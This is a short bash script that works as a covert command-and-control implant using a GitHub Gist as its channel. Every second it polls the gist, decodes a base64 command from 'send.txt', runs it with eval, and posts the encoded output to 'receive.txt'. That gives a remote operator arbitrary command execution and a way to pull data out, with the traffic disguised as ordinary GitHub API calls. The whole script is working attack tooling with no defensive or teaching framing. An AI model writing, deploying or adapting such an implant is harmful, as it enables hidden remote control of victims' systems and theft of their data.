#!/bin/bash

GITHUB_API_KEY=""
GIST_ID=""
ETAG=""

while true
do
  initial_response=$(curl -s -i -H "Accept: application/vnd.github+json" \
      -H "Authorization: Bearer ${GITHUB_API_KEY}" \
      -H "X-GitHub-Api-Version: 2022-11-28" \
      -H "if-none-match: ${ETAG}" https://api.github.com/gists/${GIST_ID})

  status_code=$(echo "$initial_response" | grep HTTP | awk '{print $2}')

  if [[ "${status_code}" != "304" ]]; then # there is something new here!
  
    current_etag=$(echo "$initial_response" | grep -i etag | awk '{print $2}')
    current_etag="${current_etag::-5}"
    ETAG="${current_etag}"

    COMMAND=$(curl -s -L \
    -H "Accept: application/vnd.github+json" \
    -H "Authorization: Bearer ${GITHUB_API_KEY}" \
    -H "X-GitHub-Api-Version: 2022-11-28" \
    https://api.github.com/gists/${GIST_ID} | \
    python2 -c "import sys, json; print json.load(sys.stdin)['files']['send.txt']['content']" | base64 --decode)

    if [[ "${COMMAND}" != "@" ]]; then # if there is a command then do this!

      # get command from correct file and execute
      output=$(eval ${COMMAND} 2>&1 | base64 -w 0)
      curl -s -o /dev/null -L \
      -X PATCH \
      -H "Accept: application/vnd.github+json" \
      -H "Authorization: Bearer ${GITHUB_API_KEY}" \
      -H "X-GitHub-Api-Version: 2022-11-28" \
      https://api.github.com/gists/${GIST_ID} \
      -d '{"files":{"send.txt":{"content":"@"}}}'

      # output command to correct file
      curl -s -o /dev/null -L \
      -X PATCH \
      -H "Accept: application/vnd.github+json" \
      -H "Authorization: Bearer ${GITHUB_API_KEY}" \
      -H "X-GitHub-Api-Version: 2022-11-28" \
      https://api.github.com/gists/${GIST_ID} \
      -d "{\"files\":{\"receive.txt\":{\"content\":\"${output}\"}}}"
    fi
  fi
  sleep 1
done